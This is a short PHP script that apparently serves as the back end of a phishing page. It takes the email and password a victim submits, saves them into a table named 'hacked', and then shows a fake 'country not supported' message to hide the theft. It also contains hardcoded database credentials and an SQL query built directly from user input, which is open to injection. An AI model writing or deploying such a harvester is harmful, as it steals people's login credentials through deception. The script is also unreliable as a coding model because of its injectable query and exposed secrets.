<?php

$host = "localhost";
$dbname = "id17754443_phishing";
$username = "id17754443_root";
$password = "bepfJevLMNO7y2Dlo%LS";
$email = $_POST["email"];
$pass = $_POST["pass"];

$conn = mysqli_connect($host,$username,$password,$dbname);
if (!$conn) {
  die("Error , Something went wrong 001." . mysqli_connect_error());}

$sql = "INSERT INTO hacked (email, password)
VALUES ('$email', '$pass')";

if (mysqli_query($conn, $sql)) {
  echo "sorry , Your country doesn't support this website 002.";
} else {
  echo "Error , Something went wrong 002." . $sql . "<br>" . mysqli_error($conn);
}

mysqli_close($conn);
?>
